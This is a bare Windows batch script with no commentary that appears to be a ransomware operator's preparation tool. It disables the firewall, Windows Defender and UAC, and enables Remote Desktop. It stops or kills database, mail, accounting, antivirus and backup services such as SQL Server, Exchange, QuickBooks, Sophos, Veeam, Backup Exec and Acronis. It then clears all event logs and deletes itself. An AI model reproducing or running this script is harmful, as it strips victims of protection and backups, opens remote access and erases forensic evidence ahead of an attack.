netsh advfirewall set currentprofile state off
net stop MSSQLServerADHelper100
net stop MSSQL$ISARS
net stop MSSQL$MSFW
net stop SQLAgent$ISARS
net stop SQLAgent$MSFW
net stop SQLBrowser
net stop ReportServer$ISARS
net stop SQLWriter
net stop WinDefend
net stop mr2kserv
net stop MSExchangeADTopology
net stop MSExchangeFBA
net stop MSExchangeIS
net stop MSExchangeSA
net stop ShadowProtectSvc
net stop SPAdminV4
net stop SPTimerV4
net stop SPTraceV4
net stop SPUserCodeV4
net stop SPWriterV4
net stop SPSearch4
net stop MSSQLServerADHelper100
net stop IISADMIN
net stop firebirdguardiandefaultinstance
net stop ibmiasrw
net stop QBCFMonitorService
net stop QBVSS
net stop QBPOSDBServiceV12
net stop "IBM Domino Server (CProgramFilesIBMDominodata)"
net stop "IBM Domino Diagnostics (CProgramFilesIBMDomino)"
net stop IISADMIN
net stop "Simply Accounting Database Connection Manager"
net stop QuickBooksDB1
net stop QuickBooksDB2
net stop QuickBooksDB3
net stop QuickBooksDB4
net stop QuickBooksDB5
net stop QuickBooksDB6
net stop QuickBooksDB7
net stop QuickBooksDB8
net stop QuickBooksDB9
net stop QuickBooksDB10
net stop QuickBooksDB11
net stop QuickBooksDB12
net stop QuickBooksDB13
net stop QuickBooksDB14
net stop QuickBooksDB15
net stop QuickBooksDB16
net stop QuickBooksDB17
net stop QuickBooksDB18
net stop QuickBooksDB19
net stop QuickBooksDB20
net stop QuickBooksDB21
net stop QuickBooksDB22
net stop QuickBooksDB23
net stop QuickBooksDB24
net stop QuickBooksDB25
taskkill /f /im mysql* /T
taskkill /f /im IBM* /T
taskkill /f /im bes10* /T
taskkill /f /im black* /T
taskkill /f /im sql /T
taskkill /f /im store.exe /T
taskkill /f /im sql* /T
taskkill /f /im vee* /T
taskkill /f /im postg* /T
taskkill /f /im sage* /T
REG add "HKLM\SYSTEM\CurrentControlSet\services\WinDefend" /v Start /t REG_DWORD /d 4 /f
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t reg_dword /d 0 /f
net.exe stop avpsus /y
net.exe stop McAfeeDLPAgentService /y
net.exe stop mfewc /y
net.exe stop BMR Boot Service /y
net.exe stop NetBackup BMR MTFTP Service /y
net.exe stop DefWatch /y
net.exe stop ccEvtMgr /y
net.exe stop ccSetMgr /y
net.exe stop SavRoam /y
net.exe stop RTVscan /y
net.exe stop QBFCService /y
net.exe stop QBIDPService /y
net.exe stop Intuit.QuickBooks.FCS /y
net.exe stop QBCFMonitorService /y
net.exe stop YooBackup /y
net.exe stop YooIT /y
net.exe stop zhudongfangyu /y
net.exe stop stc_raw_agent /y
net.exe stop VSNAPVSS /y
net.exe stop VeeamTransportSvc /y
net.exe stop VeeamDeploymentService /y
net.exe stop VeeamNFSSvc /y
net.exe stop veeam /y
net.exe stop PDVFSService /y
net.exe stop BackupExecVSSProvider /y
net.exe stop BackupExecAgentAccelerator /y
net.exe stop BackupExecAgentBrowser /y
net.exe stop BackupExecDiveciMediaService /y
net.exe stop BackupExecJobEngine /y
net.exe stop BackupExecManagementService /y
net.exe stop BackupExecRPCService /y
net.exe stop AcrSch2Svc /y
net.exe stop AcronisAgent /y
net.exe stop CASAD2DWebSvc /y
net.exe stop CAARCUpdateSvc /y
net.exe stop sophos /y
for /F "tokens=*" %%1 in ('wevtutil.exe el') DO wevtutil.exe cl "%%1"
del %0
